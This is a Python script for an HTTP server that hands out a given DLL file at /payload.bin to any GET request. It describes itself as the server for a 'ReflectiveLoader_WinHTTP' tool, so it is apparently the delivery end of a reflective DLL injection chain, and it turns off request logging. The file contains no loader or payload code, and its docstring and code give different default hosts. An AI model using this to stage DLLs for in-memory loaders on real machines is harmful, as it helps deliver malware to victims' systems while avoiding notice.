"""HTTP server that serves a DLL file as raw bytes.

Usage:
    python server.py <dll_path> [--port 8080] [--host 0.0.0.0]

The DLL is served at /payload.bin (or any path — the server returns it for all GET requests).
"""
import argparse
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path


def main():
    parser = argparse.ArgumentParser(description="HTTP DLL server for ReflectiveLoader_WinHTTP")
    parser.add_argument("dll", type=Path, help="Path to DLL file")
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument("--host", default="127.0.0.1")
    args = parser.parse_args()

    dll_data = args.dll.read_bytes()
    print(f"[*] Loaded {args.dll.name} ({len(dll_data)} bytes)")

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(dll_data)))
            self.end_headers()
            self.wfile.write(dll_data)
            print(f"[+] Served {len(dll_data)} bytes to {self.client_address[0]}")

        def log_message(self, format, *a):
            pass  # silence default logging

    server = HTTPServer((args.host, args.port), Handler)
    print(f"[*] Listening on {args.host}:{args.port}")
    print(f"[*] Ctrl+C to stop")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopped")


if __name__ == "__main__":
    main()
